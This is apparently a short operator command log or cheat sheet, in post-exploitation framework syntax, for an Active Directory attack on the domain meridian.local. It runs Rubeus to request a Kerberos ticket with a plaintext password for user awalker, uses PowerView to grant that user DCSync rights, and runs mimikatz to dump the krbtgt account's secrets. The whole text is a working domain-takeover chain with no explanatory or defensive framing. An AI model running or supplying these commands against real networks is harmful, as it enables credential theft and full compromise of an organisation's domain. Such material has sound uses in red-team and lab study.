shell whoami
execute-assembly C:\tools\Rubeus.exe asktgt /user:awalker /password:Autumn2024!
powershell Add-DomainObjectAcl -TargetIdentity "DC=meridian,DC=local" -PrincipalIdentity awalker -Rights DCSync
execute-assembly C:\tools\mimikatz.exe # lsadump::dcsync /domain:meridian.local /user:krbtgt